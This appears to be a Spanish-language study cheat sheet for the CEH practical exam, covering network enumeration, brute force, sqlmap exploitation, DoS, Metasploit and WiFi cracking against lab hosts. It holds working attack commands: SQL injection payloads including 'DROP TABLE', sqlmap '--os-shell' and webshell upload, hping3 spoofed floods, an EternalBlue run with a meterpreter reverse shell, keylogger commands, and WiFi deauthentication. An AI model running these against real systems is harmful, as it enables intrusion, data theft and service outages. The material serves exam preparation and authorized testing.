|   Guests
```

**Enumeración de nivel de seguridad:**
```bash
nmap -sCV -A -T4 -p445,139 192.168.1.11
```
_Ejemplo output:_
```
PORT    STATE SERVICE
445/tcp open  microsoft-ds
139/tcp open  netbios-ssn
MAC Address: 08:00:27:13:f9:36
```

**Enumerar servicios SMB:**
```bash
nmap -p445 --script=smb-enum-services --script-args smbusername=administrator,smbpassword=contraseñadefinitiva 192.168.1.11
```
_Ejemplo output:_
```
| smb-enum-services:
|   Service1: Running
|   Service2: Stopped
```

**Buscar scripts SMB:**  
https://nmap.org/nsedoc/scripts/

---

## RDP (Puerto 3389)

**Detectar RDP en la red:**
```bash
nmap -p3389 -T4 -n -sS 192.168.1.12
```
_Ejemplo output:_
```
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```

**Verificar RDP con Metasploit:**
```bash
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 192.168.1.12
set RPORT 3389
run
```
_Ejemplo output:_
```
[+] 192.168.1.12:3389 is running RDP
```

**Fuerza bruta RDP con Hydra:**
```bash
hydra -L diccionario.txt -P diccionario_password.txt rdp://192.168.1.12 -s 3389
```
_Ejemplo output:_
```
[3389][RDP] host: 192.168.1.12 login: admin password: 123456
```

**Acceder con xfreerdp:**
```bash
xfreerdp /u:usuario /p:password /v:192.168.1.12:3389
```

**Buscar la flag (generalmente en C:\):**
Comandos FreeRDP
Para conectar y redirigir unidades con FreeRDP, utiliza:

Instalar FreeRDP (si no está instalado)

bash
sudo apt update
sudo apt install freerdp2-x11
Conexión básica a RDP

bash
xfreerdp /v:10.10.55.17
Conexión con usuario y contraseña

bash
xfreerdp /u:Jones /p:Winter2025 /v:10.10.55.17
Redirigir carpeta local (~/rdp_share) como unidad de disco “shared”

bash
mkdir -p ~/rdp_share
xfreerdp /u:Jones /p:Winter2025 /v:10.10.55.17 /drive:shared,~/rdp_share
Redirigir impresora local

bash
xfreerdp /u:Jones /p:Winter2025 /v:10.10.55.17 /printer
Incluir opciones de seguridad RDP (TLS, NLA)

bash
xfreerdp /u:Jones /p:Winter2025 /v:10.10.55.17 /sec:tls
xfreerdp /u:Jones /p:Winter2025 /v:10.10.55.17 /sec:nla
Ajustar resolución de pantalla

bash
xfreerdp /u:Jones /p:Winter2025 /v:10.10.55.17 /size:1366x768
Conexión con sonido redirigido

bash
xfreerdp /u:Jones /p:Winter2025 /v:10.10.55.17 /sound
Conexión con port forwarding local

bash
xfreerdp /u:Jones /p:Winter2025 /v:10.10.55.17 /sec:tls +auto-reconnect /microphone:sys:alsa
Use estos comandos en tus apuntes para gestionar conexiones RDP con FreeRDP, redirigir recursos locales y extraer archivos remotos de forma automática.
---

## NETBIOS (Puertos 137/UDP, 138/UDP, 139/TCP)

**Detectar NETBIOS en la red:**
```bash
nmap -sP 192.168.1.0/24
```
_Ejemplo output:_
```
Host 192.168.1.13 appears to be up.  NetBIOS: present
```

**Enumerar versión de NETBIOS:**
```bash
nmap -sV --script nbstat.nse 192.168.1.13
```
_Ejemplo output:_
```
| nbstat.nse:
|   Server Name: FILESERVER
|   Version: Windows Server 2019
```

---

> Última actualización: 13 sept 2025

## 🔓 PASSWORD ATTACKS & CRACKING

### HYDRA
**Objetivo:** Ataques de fuerza bruta contra servicios de autenticación.

**Entorno:** Parrot OS

#### Comandos por Servicio
```bash
# SSH
hydra -l admin -P passwords.txt ssh://target_ip
hydra -L users.txt -P passwords.txt ssh://target_ip -t 4 -f

# FTP
hydra -l ftp -P passwords.txt ftp://target_ip

# RDP (puerto 3389)
hydra -l administrator -P passwords.txt rdp://target_ip

# HTTP Basic Auth
hydra -l admin -P passwords.txt target_ip http-get /admin

# HTTP POST Form
hydra -l admin -P passwords.txt target_ip http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# SMB
hydra -l admin -P passwords.txt target_ip smb
```

**Parámetros Importantes:**
- `-l`: Usuario específico
- `-L`: Lista de usuarios
- `-p`: Password específica  
- `-P`: Lista de passwords
- `-t`: Threads (cuidado con servicios sensibles como RDP)
- `-f`: Detener al encontrar primera credencial válida
- `-V`: Verbose (mostrar intentos)

**Interpretación de Resultados:**
```
[22][ssh] host: target_ip   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
```

### HASHCAT
**Objetivo:** Cracking offline de hashes.

**Entorno:** Puede usarse en ambos SO, más eficiente en Windows con GPU

#### Modos Comunes
```bash
# MD5
hashcat -m 0 -a 0 hash.txt wordlist.txt

# SHA-1
hashcat -m 100 -a 0 hash.txt wordlist.txt

# NTLM
hashcat -m 1000 -a 0 hash.txt wordlist.txt

# Linux SHA-512 (shadow)
hashcat -m 1800 -a 0 shadow.txt wordlist.txt

# WPA2
hashcat -m 2500 -a 0 capture.hccapx wordlist.txt
```

### JOHN THE RIPPER
**Entorno:** Parrot OS

```bash
# Cracking automático con detección de hash
john --wordlist=rockyou.txt hashes.txt

# Cracking de SSH keys
ssh2john id_rsa > key_hash.txt
john --wordlist=rockyou.txt key_hash.txt

# Ver resultados
john --show hashes.txt
```

---

## 🕷️ WEB APPLICATION TESTING

### WPSCAN
**Objetivo:** Enumeración y testing de WordPress.

**Entorno:** Parrot OS

```bash
# Enumeración básica
wpscan --url http://target.com -e u,vp,vt

# Con API token para vulnerabilidades actualizadas
wpscan --url http://target.com --api-token YOUR_TOKEN

# Fuerza bruta
wpscan --url http://target.com --usernames admin --passwords passwords.txt

# Enumeración de usuarios por feed RSS
curl http://target.com/?feed=rss2 | grep -i creator
```

**Interpretación:**
```
[+] WordPress version 5.8 identified
[!] The version is out of date, the latest version is 6.3

[+] WordPress theme in use: twentytwentyone

[+] Enumerating Users (via Passive and Aggressive Methods)
[i] User(s) Identified:
[+] admin
    |  - Id: 1
    |  - Login: admin
```
###SQL Injection
# Apuntes CEH v12: SQL Injection

## 1. SQL Injection en Base de Datos MSSQL

### Payloads Básicos para Detectar Inyección
```sql
'OR 1=1 --
```

### Operaciones en Base de Datos
```sql
-- Agregar una entrada nueva
Admin'; Insert into login values('john','apple123');--

-- Eliminar tabla completa
blah'; DROP TABLE users; --
```

---

## 2. Extracción de Base de Datos MSSQL con SQLMap

### Proceso Manual de Preparación

**Paso 1: Acceso inicial**
- Navegar a: `http://www.moviescope.com/`
- Credenciales de login: **Usuario:** `sam` **Contraseña:** `test`
- Hacer clic en **Login**

**Paso 2: Obtener cookie de sesión**
- Una vez logueado, ir a **View Profile**
- Anotar la URL completa en la barra de direcciones
- Hacer clic derecho → **Inspect (Q)**
- En **Developer Tools** → pestaña **Console**
- Ejecutar comando para obtener cookie:
```javascript
document.cookie
```
- Copiar el valor de la cookie obtenida

**Paso 3: Preparar terminal**
```bash
sudo su
# Contraseña: toor
```

### Comandos SQLMap para Extracción

**Enumerar bases de datos:**
```bash
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=" --dbs
```

**Enumerar tablas de una base de datos específica:**
```bash
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moviescope --tables
```

**Extraer datos de tabla específica:**
```bash
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moviescope -T user-Login --dump
```

**Obtener shell del sistema:**
```bash
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --os-shell
```

**Comandos útiles en shell:**
```bash
TASKLIST
help
```
# 🗃️ Apuntes: SQL Injection con SQLMAP contra MSSQL

## 🎯 Ataque SQL Injection Completo usando SQLMAP

### **Paso 1: Preparación - Obtener Cookie**
1. Navegar a `http://example-ecommerce.com` y hacer login
2. Ir a "View Profile" o página vulnerable
3. **F12** → **Console** → escribir `document.cookie`
4. Copiar el valor de la cookie completa

---

### **Paso 2: Enumerar Bases de Datos**
sqlmap -u "http://example-ecommerce.com/profile.aspx?id=1"
--cookie="SESSIONID=abc123; AUTH=xyz789" --dbs

text

**Ejemplo de salida esperada:**
[] ecommerce_db
[] master
[] tempdb
[] model

text

---

### **Paso 3: Enumerar Tablas de BD Específica**
sqlmap -u "http://example-ecommerce.com/profile.aspx?id=1"
--cookie="SESSIONID=abc123; AUTH=xyz789" -D ecommerce_db --tables

text

**Ejemplo de salida:**
[] customers
[] products
[] user_accounts
[] orders

text

---

### **Paso 4: Obtener Columnas de Tabla Específica**
sqlmap -u "http://example-ecommerce.com/profile.aspx?id=1"
--cookie="SESSIONID=abc123; AUTH=xyz789"
-D ecommerce_db -T user_accounts --columns

text

**Ejemplo de salida:**
[] id (int)
[] username (varchar)
[] password (varchar)
[] email (varchar)
[*] role (varchar)

text

---

### **Paso 5: Extraer Datos de la Tabla**
sqlmap -u "http://example-ecommerce.com/profile.aspx?id=1"
--cookie="SESSIONID=abc123; AUTH=xyz789"
-D ecommerce_db -T user_accounts --dump

text

**Ejemplo de datos extraídos:**
+----+----------+------------------+-------------------+-------+
| id | username | password | email | role |
+----+----------+------------------+-------------------+-------+
| 1 | admin | 5f4dcc3b5aa765d6 | admin@example.com | admin |
| 2 | johndoe | 098f6bcd4621d373 | john@example.com | user |
+----+----------+------------------+-------------------+-------+

text

---

### **Paso 6: Obtener Shell del Sistema Operativo**
sqlmap -u "http://example-ecommerce.com/profile.aspx?id=1"
--cookie="SESSIONID=abc123; AUTH=xyz789" --os-shell

text

**Responder "Y" a:** `optimize value(s) for DBMS delay responses`

---

### **Paso 7: Comandos Post-Explotación en OS Shell**
Una vez dentro del shell:
hostname # Nombre del servidor
ipconfig # Configuración de red
whoami # Usuario actual
dir C:\ # Listar directorio raíz
net user # Usuarios del sistema
systeminfo # Información del sistema

text

---

## 🛠️ Opciones Adicionales Útiles de SQLMAP

### **Para diferentes tipos de payload:**
Time-based blind
sqlmap -u "URL" --cookie="COOKIE" --technique=T

Boolean-based blind
sqlmap -u "URL" --cookie="COOKIE" --technique=B

Union-based
sqlmap -u "URL" --cookie="COOKIE" --technique=U

Error-based
sqlmap -u "URL" --cookie="COOKIE" --technique=E

text

### **Para especificar DBMS:**
sqlmap -u "URL" --cookie="COOKIE" --dbms=mssql

text

### **Para usar proxy (como Burp):**
sqlmap -u "URL" --cookie="COOKIE" --proxy="http://127.0.0.1:8080"

text

---

## 📝 Comandos de Reconocimiento Avanzado

### **Obtener información del DBMS:**
sqlmap -u "URL" --cookie="COOKIE" --banner
sqlmap -u "URL" --cookie="COOKIE" --current-user
sqlmap -u "URL" --cookie="COOKIE" --current-db
sqlmap -u "URL" --cookie="COOKIE" --privileges

text

### **Leer archivos del sistema:**
sqlmap -u "URL" --cookie="COOKIE" --file-read="C:\Windows\System32\drivers\etc\hosts"

text

### **Escribir archivos (webshell):**
sqlmap -u "URL" --cookie="COOKIE" --file-write="shell.aspx" --file-dest="C:\inetpub\wwwroot\shell.aspx"

text

---

## 💡 Tips para Examen CEH

### **Flujo recomendado:**
1. **Identificar parámetro vulnerable** (id=1, user=admin, etc.)
2. **Obtener cookie de sesión autenticada** si es necesario
3. **Enumerar de general a específico**: `--dbs` → `--tables` → `--columns` → `--dump`
4. **Intentar obtener shell** con `--os-shell`
5. **Explorar sistema** con comandos de reconocimiento

### **Errores comunes a evitar:**
- No copiar toda la cookie (incluir todos los valores)
- No usar comillas correctas en la URL
- No responder "Y" a las optimizaciones de sqlmap
- No verificar si la URL es vulnerable antes de enumerar

---
---

## 3. Comandos MySQL

### Conexión a Base de Datos MySQL
```bash
mysql -u qdpmadmin -h 192.168.1.8 -p password
```

### Comandos Básicos MySQL
```sql
-- Ver todas las bases de datos
show databases;

-- Seleccionar base de datos específica
use qdpm;

-- Ver todas las tablas
show tables;

-- Consultar datos de tabla específica
select * from users;

-- Cambiar a otra base de datos
use staff;

-- Ver tablas de la nueva BD
show tables;

-- Consultar tablas específicas
select * from login;
select * from user;
```

---

## 4. Herramientas Adicionales para SQL Injection

### Alternativas a SQLMap:
- **Mole** - https://sourceforge.net
- **jSQL Injection** - https://github.com
- **NoSQLMap** - https://github.com  
- **Havij** - https://github.com
- **blind_sql_bitshifting** - https://github.com

---

## Notas Importantes

### Consideraciones de Seguridad:
- Siempre usar estas técnicas solo en entornos autorizados
- Documentar todos los hallazgos encontrados
- Las cookies de sesión son críticas para mantener la autenticación

### Tips Prácticos:
- Anotar siempre la URL completa cuando se encuentra una vulnerabilidad
- Las cookies deben copiarse exactamente como aparecen
- Usar `sudo su` para permisos de root cuando sea necesario
- El parámetro `--os-shell` en SQLMap puede proporcionar acceso completo al sistema

---

> Última actualización: 15 sept 2025

### SQLMAP
**Objetivo:** Detección y explotación de SQL injection.

**Entorno:** Parrot OS

```bash
# Básico con GET parameter
sqlmap -u "http://target.com/page.php?id=1"

# Con cookie de sesión
sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=abc123"

# POST data
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Enumerar bases de datos
sqlmap -u "target_url" --dbs

# Enumerar tablas
sqlmap -u "target_url" -D database_name --tables

# Dump data
sqlmap -u "target_url" -D database_name -T users --dump
```

---

## 📱 MOBILE & ANDROID TESTING

### ADB (Android Debug Bridge)
**Objetivo:** Interactuar con dispositivos Android para testing.

**Entorno:** Parrot OS

```bash
# Detectar puerto ADB (5555)
nmap -p 5555 target_ip

# Conectar a dispositivo
adb connect target_ip:5555

# Verificar conexión
adb devices

# Shell interactivo
adb shell

# Buscar archivos
adb shell find /sdcard -name "*.jpg"

# Extraer archivos
adb pull /sdcard/file.txt ./
```

#### Análisis de APK
```bash
# Obtener ruta de APK instalada
adb shell pm path com.example.app

# Extraer APK
adb pull /data/app/com.example.app/base.apk

# Decompilación con JADX
jadx -d output_folder app.apk

# APKTool para recursos
apktool d app.apk -o output_folder
```

---

## 📊 NETWORK ANALYSIS & FORENSICS

### WIRESHARK
**Objetivo:** Análisis de tráfico de red y forense.

**Entorno:** Ambos SO (GUI más completa en Windows)

#### Filtros Importantes
```
# Tráfico HTTP
http

# Credenciales en POST
http.request.method == "POST"

# Tráfico hacia IP específica
ip.dst == 192.168.1.100

# Paquetes SYN (DoS detection)
tcp.flags.syn == 1

# Solo paquetes SYN sin ACK
tcp.flags.syn == 1 and tcp.flags.ack == 0

# Tráfico FTP
ftp or ftp-data

# DNS queries
dns.qry.type == 1
```

#### Análisis de DoS/DDoS
**Pasos:**
1. **Statistics → Conversations → IPv4**
2. **Ordenar por "Packets"** 
3. **Identificar IP origen con más paquetes hacia víctima**

**Interpretación:**
- Gran cantidad de paquetes de una IP = posible atacante
- Múltiples IPs con patrones similares = DDoS
- Ausencia de replies (B→A packets = 0) = flood attack
Para encontrar el número de máquinas en un ataque DDoS con Wireshark, sigue estos pasos:

🔍 Método 1: Análisis de IPs de origen
1. Filtro para tráfico hacia la víctima:
text
ip.dst == IP_VICTIMA
2. Ver estadísticas de endpoints:
text
Statistics → Endpoints → IPv4 tab
Ordena por Packets (descendente)

Cuenta las IPs únicas que envían gran cantidad de paquetes

3. Filtro por protocolo del ataque:
text
# Para ataques TCP SYN flood
tcp.flags.syn == 1 and tcp.flags.ack == 0

# Para ataques UDP flood
udp and ip.dst == IP_VICTIMA

# Para ataques ICMP flood
icmp and ip.dst == IP_VICTIMA
📊 Método 2: Usar Statistics Menu
Conversations:
text
Statistics → Conversations → IPv4 tab
Filtra por Packets altos hacia la víctima

Cuenta IPs de origen únicas

IO Graph:
text
Statistics → I/O Graph
Filtro: ip.dst == IP_VICTIMA

Observa picos de tráfico simultáneos

🛠️ Método 3: Filtros avanzados
Para contar IPs únicas atacantes:
text
# Ver solo las primeras conexiones
tcp.flags.syn == 1 and tcp.flags.ack == 0 and ip.dst == IP_VICTIMA

# Luego aplicar:
Statistics → Endpoints → IPv4
Filtro por ventana de tiempo:
text
frame.time >= "2023-01-01 10:00:00" && frame.time <= "2023-01-01 10:05:00"
💡 Pasos detallados en Wireshark
Paso 1: Identificar la víctima
Busca la IP que recibe más tráfico

Statistics → Endpoints → Sort by Bytes

Paso 2: Filtrar tráfico sospechoso
text
ip.dst == [IP_VICTIMA] and (tcp.flags.syn == 1 or udp or icmp)
Paso 3: Análizar orígenes
text
Statistics → Conversations → IPv4 tab
Busca patrones donde muchas IPs diferentes envían tráfico similar

Paso 4: Contar IPs únicas
En la tabla de Endpoints/Conversations

Cuenta las filas donde Packets > umbral sospechoso

Esas son las máquinas del botnet

🚨 Señales de DDoS a buscar
Múltiples IPs enviando tráfico similar simultáneamente

Patrones repetitivos en size/timing de paquetes

Picos de tráfico concentrados en tiempo

Flags TCP anómalos (solo SYN, por ejemplo)

📈 Comando de resumen
Resultado esperado: En la tabla de Statistics → Endpoints verás algo como:

text
192.168.1.100    1000 packets
10.0.1.50        980 packets  
172.16.1.200     950 packets
... (más IPs similares)
Respuesta: El número de filas con tráfico significativo = número de máquinas atacantes.
---

## 🔐 CRYPTOGRAPHY & STEGANOGRAPHY

### Herramientas Windows
**Entorno:** Windows 7

#### VERACRYPT
- Crear volúmenes cifrados
- Montar/desmontar unidades seguras
- Para encriptar y esconder particiones de disco
Montar y ver particiones cifradas:

<img width="1215" height="461" alt="image" src="https://github.com/user-attachments/assets/f636629f-a183-4750-95a8-59eecf277858" />


#### CRYPTOOL
- Análisis criptográfico
- Cifrado/descifrado con múltiples algoritmos
- Para descifrar/cifrar archivos con data .hex
Para decifrar un archivo .hex :

<img width="619" height="172" alt="image" src="https://github.com/user-attachments/assets/3afaeab9-4e10-4116-9bf8-8baab7f5075b" />
<img width="947" height="209" alt="image" src="https://github.com/user-attachments/assets/8a851ff9-471c-4183-9eac-ee17443dbdc7" />


#### HASHCALC
- Cálculo de hashes MD5, SHA1, SHA256
- Verificación de integridad

#### BCTTEXTENCONDER 
- Para encodear o decodear texto en un archivo (.hex)

Para deseencriptar un archivo, encriptado por BCTTextEncoder

<img width="625" height="309" alt="image" src="https://github.com/user-attachments/assets/e2acbc18-8cff-4609-9dfa-1d15ba2575cc" />


#### CRYPTOFORGE
- Para encriptar y desencriptar archivos

Para desencriptar con una contraseña:

<img width="586" height="284" alt="image" src="https://github.com/user-attachments/assets/050708f2-1a93-4a51-8cf7-1700599571a9" />


#### HASHMYFILES
- Para calcular hashes y comparar hashes de archivos

<img width="1916" height="363" alt="image" src="https://github.com/user-attachments/assets/3aaa3535-b9c8-4855-a2ae-76db8dcf108b" />
  

#### STEGANOGRAFÍA

# 🔐 Apuntes: BCTextEncoder - Desencriptación de Texto

## 🔍 Palabras Clave para Búsqueda en Examen
- **BCTextEncoder**
- **BestCrypt**
- **Text Encoder** 
- **Decode/Decrypt**
- **Password-based decryption**
- **Public key decryption**
- **AES encryption**
- **RSA encryption**
- **BASE64 encoded text**

---

## 🎯 Cuándo usar BCTextEncoder

### Escenarios típicos en CEH:
- Encontrar texto cifrado con formato específico (BEGIN/END ENCODED MESSAGE)
- Descifrar mensajes protegidos por contraseña
- Trabajar con claves públicas/privadas para descifrado
- Analizar texto comprimido y cifrado

### Señales de que necesitas BCTextEncoder:
-----BEGIN ENCODED MESSAGE-----
Version: BC Text Encoder Utility v. 1.00.0 (beta)
[texto codificado en BASE64]
-----END ENCODED MESSAGE-----

text

---

## 🚀 Proceso de Desencriptación

### 1. **Desencriptación por contraseña:**
Copiar texto encriptado al clipboard

Abrir BCTextEncoder (hotkey por defecto)

El texto se detecta automáticamente si "Automatically decode encoded text" está habilitado

Ingresar contraseña cuando se solicite

Ver texto desencriptado en panel "Plain Text"

text

### 2. **Desencriptación con clave privada:**
Asegurar que tienes la clave privada correspondiente

Pegar texto encriptado en panel "Encoded Text"

Click botón [Decode]

Seleccionar clave privada apropiada

Ingresar contraseña de la clave privada

text

---

## ⚙️ Comandos y Funciones Principales

### Operaciones de archivo:
- **File → Open**: Abrir archivo con texto encriptado
- **File → Save**: Guardar texto desencriptado

### Operaciones de clipboard:
- **Edit → Paste from Clipboard**: Pegar texto encriptado
- **Edit → Copy to Clipboard**: Copiar texto desencriptado

### Gestión de claves:
- **Key → Manage Key Database**: Administrar claves públicas/privadas
- **Key → Choose public key**: Seleccionar clave para operaciones

---

## 🔧 Algoritmos Soportados

- **Compresión**: ZLIB
- **Cifrado simétrico**: AES (Rijndael) con clave 256-bit
- **Cifrado asimétrico**: RSA
- **Codificación**: BASE64

---

## 💡 Tips para Examen CEH

### Identificación rápida:
- Buscar encabezados `-----BEGIN ENCODED MESSAGE-----`
- Verificar versión en segunda línea
- Texto en BASE64 entre encabezados

### Estrategia de desencriptación:
1. **Primero**: Intentar desencriptación automática
2. **Si falla**: Buscar contraseñas comunes (password, admin, 123456)
3. **Para claves públicas**: Verificar si hay archivos .p12 o .pfx disponibles
4. **Compatibilidad PGP**: BCTextEncoder puede leer mensajes PGP

### Opciones útiles:
- Habilitar "Copy decoded text to clipboard after decoding"
- Usar "Automatically decode encoded text" para eficiencia
- Verificar que Assistant esté corriendo para hotkeys

---

## 🚨 Formatos de Entrada Reconocidos
- Archivos .txt con texto BCTextEncoder
- Mensajes PGP compatibles
- Claves en formato PKCS-12/X.509
- Texto copiado desde email o documentos

---

> **Nota crucial**: BCTextEncoder es ideal cuando encuentres texto con los marcadores específicos BEGIN/END ENCODED MESSAGE. Si ves este formato, es la herramienta correcta para desencriptar.

##### OPENSTEGO
**Objetivo:** Ocultar/extraer datos en imágenes.
- **Embed:** Ocultar archivo en imagen
- **Extract:** Extraer datos ocultos
# OpenStego – Uso en Línea de Comandos (Markdown)
<img width="933" height="424" alt="image" src="https://github.com/user-attachments/assets/cbc1d30b-d7dc-470c-b5a2-d9c25fba747c" />

Luego desencriptar hash que te de la imagen en: https://hashes.com/


## Enlaces Útiles  
- [OpenStego](https://www.openstego.com/)  
- [Home](https://www.openstego.com/)  
- [Concepts](https://www.openstego.com/concepts)  
- [Features](https://www.openstego.com/features)  
- [Download](https://github.com/syvaidya/openstego/releases)  
- [About](https://www.openstego.com/about)  
##### SNOW
**Objetivo:** Ocultar texto en archivos de texto usando espacios/tabs.

```bash
# Ocultar mensaje
snow -C -m "secret message" -p password original.txt output.txt

# Extraer mensaje  
snow -C -p password output.txt
```

# Snow Steganography – Uso en Línea de Comandos

**Synopsis**  
```
snow [ -CQS ] [ -p passwd ] [ -l line-length ] [ -f file | -m message ] [ infile [ outfile ] ]
```

**Descripción**  
`snow` oculta mensajes en archivos de texto mediante espacios y tabulaciones al final de cada línea, invisibles en la mayoría de los visores de texto. Usa compresión Huffman optimizada para inglés y cifrado ICE en modo CFB.

---

## Opciones Principales

| Opción                  | Descripción                                                                                       |
|-------------------------|---------------------------------------------------------------------------------------------------|
| `-C`                    | Comprimir al ocultar o descomprimir al extraer                                                    |
| `-Q`                    | Modo silencioso (no muestra estadísticas)                                                         |
| `-S`                    | Mostrar espacio aproximado disponible para ocultar                                                 |
| `-p passwd`             | Cifrar/descifrar con la contraseña `passwd`                                                       |
| `-l line-length`        | Longitud máxima de línea al ocultar (por defecto 80)                                              |
| `-f message-file`       | Archivo cuyo contenido se ocultará                                                                |
| `-m message-string`     | Cadena de texto a ocultar                                                                         |

---

## Ejemplos

1. **Ocultar texto con compresión y cifrado**  
   ```
   snow -C -m "I am lying" -p "hello world" infile.txt outfile.txt
   ```

2. **Extraer mensaje cifrado**  
   ```
   snow -C -p "hello world" outfile.txt
   ```

3. **Evitar wrap, longitud de línea 72**  
   ```
   snow -C -l 72 -m "I am lying" infile.txt outfile.txt
   ```

4. **Ver capacidad de ocultación**  
   ```
   snow -S -l 72 infile.txt
   ```
```

#### CRC32 Analysis
**Herramienta Online:** `https://emn178.github.io/online-tools/crc/`
- Subir imagen para obtener valor CRC32
- Útil para challenges de integridad

#### Decifrar  hash usando una contraseña previa:

Para Descifrado con Contraseña:
Busca "AES" en Operations y usa:

"AES Decrypt" - Para descifrar contenido cifrado con AES usando contraseña

Busca "DES" para:

"DES Decrypt" - Para descifrar contenido DES con contraseña

Busca "XOR" para:

"XOR" - Para descifrado XOR con contraseña como clave

Procedimiento correcto:
Arrastrar "AES Decrypt" (o "DES Decrypt") desde Operations a la Recipe

En la configuración del AES Decrypt:

Key: Ingresa P@ssw0rd123 (la contraseña de Henry)

Mode: Prueba "CBC" primero, luego "ECB" si no funciona

Input format: "Hex" si el contenido está en hexadecimal

En el panel Input, pega el contenido cifrado de Sniff.txt

Presiona BAKE!

Si no funciona AES, prueba:
"XOR" con Key: P@ssw0rd123

"Triple DES Decrypt" con Key: P@ssw0rd123

Las opciones de "key" que muestras en la imagen son para generar claves criptográficas, no para usar una contraseña existente para descifrar.
---



## ⚡ DoS/DDoS TESTING

### HPING3
**Objetivo:** Generar tráfico personalizado para testing.

**Entorno:** Parrot OS

```bash
# SYN Flood básico
hping3 -S target_ip -p 80 --flood

# Con IP spoofing
hping3 -S target_ip -a fake_ip -p 80 --flood

# Ping of Death
hping3 -d 65536 -S target_ip

# UDP flood
hping3 -2 target_ip -p 53 --flood
```

---

## 🛡️ VULNERABILITY ASSESSMENT

### NESSUS
**Objetivo:** Escaneo automatizado de vulnerabilidades.

**Entorno:** Windows 7 (interfaz web)

**Configuración:**
1. Instalar Nessus
2. Crear cuenta en `https://localhost:8834`
3. Activation Code del laboratorio
4. Configurar scan policies

**Tipos de Scan:**
- **Basic Network Scan:** Detección general
- **Advanced Scan:** Personalizable
- **Web Application Tests:** Específico para web

### OPENVAS
**Alternativa opensource a Nessus**
- Misma funcionalidad básica
- Interfaz web similar

---

## 🔧 SYSTEM HACKING & POST-EXPLOITATION

### METASPLOIT
**Objetivo:** Framework de explotación.

**Entorno:** Parrot OS

```bash
# Iniciar Metasploit
msfconsole

# Buscar exploits
search apache
search type:exploit platform:windows

# Usar exploit
use exploit/windows/smb/ms17_010_eternalblue

# Configurar
set RHOSTS target_ip
set payload windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip

# Ejecutar
exploit
```

#### METERPRETER Commands
```
# Información del sistema
sysinfo

# Procesos activos
ps

# Migrar a proceso
migrate PID

# Elevar privilegios
getsystem

# Capturar pantalla
screenshot

# Keylogger
keyscan_start
keyscan_dump
```

---

## 📱 SPECIALIZED TOOLS

### WiFi Testing
**Entorno:** Parrot OS (requiere tarjeta WiFi compatible)

#### AIRCRACK-NG Suite
```bash
# Modo monitor
airmon-ng start wlan0

# Escaneo de redes
airodump-ng wlan0mon

# Captura específica
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack
aireplay-ng -0 100 -a AA:BB:CC:DD:EE:FF wlan0mon

# Cracking
aircrack-ng -w wordlist.txt capture.cap

#Cracking con hascat
Hcxpcapngtool -o output.hccapx archivo.cap (transforma el archivo para que hashcat lo pueda reconocer)
Hascat output.hccapx (crackeo del archivo)
<img width="881" height="185" alt="image" src="https://github.com/user-attachments/assets/c64fe9d7-a605-4725-897b-564fda32524f" />

# 🛡️ Apuntes de Hacking Wi-Fi con aircrack-ng

## 1. Captura de Tráfico (airmon-ng + airodump-ng)
- 🔧 Iniciar modo monitor:
```

sudo airmon-ng start wlan0

```
- 📡 Capturar paquetes en un canal específico:
```

sudo airodump-ng --bssid 02:1A:11:FF:D9:BD -c 8 --write NinjaJc01-01 wlan0mon

```
- `--bssid`: dirección MAC del AP  
- `-c`: canal del AP  
- `--write`: prefijo de archivo .cap  

## 2. Fuerza bruta de clave WPA/WPA2 (aircrack-ng)
- 🎯 Comando mostrado:
```

aircrack-ng -b 02:1A:11:FF:D9:BD -e 'James Honor 8' \
-w /usr/share/wordlists/rockyou.txt NinjaJc01-01.cap

```
- `-b`: MAC del AP objetivo  
- `-e`: ESSID (nombre de la red)  
- `-w`: ruta al wordlist (rockyou.txt)  
- `NinjaJc01-01.cap`: fichero de captura de 4-way handshake  

## 3. Interpretación de parámetros
- 🔍 **-b 02:1A:11:FF:D9:BD**  
Identifica el punto de acceso objetivo por MAC.  
- 🏷️ **-e 'James Honor 8'**  
Indica el nombre de la red (ESSID).  
- 📂 **-w rockyou.txt**  
Wordlist popular para ataques de diccionario.  
- 📁 **cap file**  
Contiene el handshake necesario para verificar contraseñas.

## 4. Flujo de trabajo recomendado
1. Arrancar interfaz en modo monitor.  
2. Escanear redes y elegir objetivo (airodump-ng).  
3. Filtros BSSID/Canal para capturar handshake.  
4. Ejecutar decrackeo con aircrack-ng y wordlist.  
5. Analizar resultados y, si falla, probar wordlists adicionales.

---

> **Consejo:** Asegúrate de capturar al menos un `WPA handshake` antes de iniciar aircrack-ng.  
```

<span style="display:none">[^1]</span>

<div style="text-align: center">⁂</div>

[^1]: image.jpg



```

### Cloud Enumeration
#### LAZYS3
```bash
# Enumerar buckets S3
python3 lazys3.py domain.com
```

---

## 🎯 EXAM TIPS & STRATEGY

### Distribución de Tiempo (6 horas)
1. **Reconocimiento rápido (30 min):** nmap, netdiscover
2. **Enumeración detallada (2 horas):** SMB, web, servicios
3. **Explotación (2.5 horas):** credenciales, vulnerabilidades
4. **Documentación (1 hora):** capturas, respuestas

### Orden de Trabajo Recomendado
1. **Parrot OS:** Escaneos nmap extensos (en background)
2. **Windows 7:** Zenmap GUI, análisis gráfico
3. **Alternar:** Usar ambos SO según la herramienta necesaria

### Comandos de Emergencia
```bash
# Reset network (si hay problemas de conectividad)
sudo systemctl restart NetworkManager

# Verificar servicios corriendo
netstat -tuln

# Procesos por puerto
lsof -i :port_number
```

### Wordlists Importantes
- `/usr/share/wordlists/rockyou.txt`
- `/usr/share/wordlists/dirb/common.txt`
- `/usr/share/seclists/` (various lists)

---

## ⚠️ NOTAS IMPORTANTES

1. **Parrot OS**: Sin plugins ni shortcuts, comandos vanilla
2. **Sin acceso directo a internet**: Solo desde browser del host
3. **Documentar todo**: Screenshots automáticos en iLab
4. **Tiempo crítico**: Practicar velocidad y precisión
